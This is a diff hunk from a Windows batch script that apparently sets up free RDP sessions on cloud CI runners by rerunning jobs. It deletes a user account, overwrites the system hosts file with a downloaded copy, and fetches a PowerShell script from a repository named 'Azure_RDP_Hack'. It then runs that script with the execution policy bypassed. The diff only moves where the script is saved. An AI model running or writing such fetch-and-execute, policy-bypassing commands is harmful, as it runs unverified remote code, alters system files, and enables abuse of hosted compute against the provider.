@@ -29,8 +29,8 @@ echo Region Available: West Europe, Central US, East Asia, Brazil South, Canada 
 echo All done! Connect your VM using RDP. When RDP expired and VM shutdown, Rerun failed jobs to get a new RDP.
 net user installer /delete
 curl -o "C:\Windows\System32\Drivers\etc\hosts" https://raw.githubusercontent.com/ztvofficial/Windows2019RDP-US/main/Files/hosts > out.txt 2>&1
-curl -o "C:\Users\administrator\Desktop\a.ps1" https://raw.githubusercontent.com/ngoc7sao9/Azure_RDP_Hack/main/a.ps1 > out.txt 2>&1
-PowerShell -NoProfile -ExecutionPolicy Bypass -Command "C:\Users\administrator\Desktop\a.ps1" > out.txt 2>&1
+curl -o "C:\Users\Public\Desktop\a.ps1" https://raw.githubusercontent.com/ngoc7sao9/Azure_RDP_Hack/main/a.ps1 > out.txt 2>&1
+PowerShell -NoProfile -ExecutionPolicy Bypass -Command "C:\Users\Public\Desktop\a.ps1" > out.txt 2>&1
 diskperf -Y >nul
 sc config Audiosrv start= auto >nul
 sc start audiosrv >nul
